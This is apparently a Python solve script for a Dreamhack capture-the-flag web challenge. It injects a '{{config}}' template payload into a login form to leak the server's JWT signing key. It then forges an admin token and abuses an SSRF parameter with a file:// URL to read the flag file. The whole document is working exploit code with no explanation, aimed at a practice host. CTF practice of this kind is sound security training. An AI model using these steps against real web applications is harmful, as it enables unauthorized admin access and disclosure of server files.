import requests
import html
import re
import jwt

url = "http://host8.dreamhack.games:8432/"

## ssti in /login   -> leak jwt key
res = requests.post(f"{url}/login", data={
    'id': '{{config}}',
    'pw': 'a'
})

key = re.findall(r'\'JWTKey\': \'(.+)\'', html.unescape(res.text))[0].strip()
print("JWT key:", key)

## ssrf
token = jwt.encode({
    'id': 'admin',
    'isAdmin': True
}, key,algorithm='HS256')

payload = 'file:///deploy/flag_[a-z][a-z][a-z][a-z].txt'

res = requests.get(f"{url}/api/metar", params={ 'airport': payload }, cookies={ 'auth': token })

print(res.text)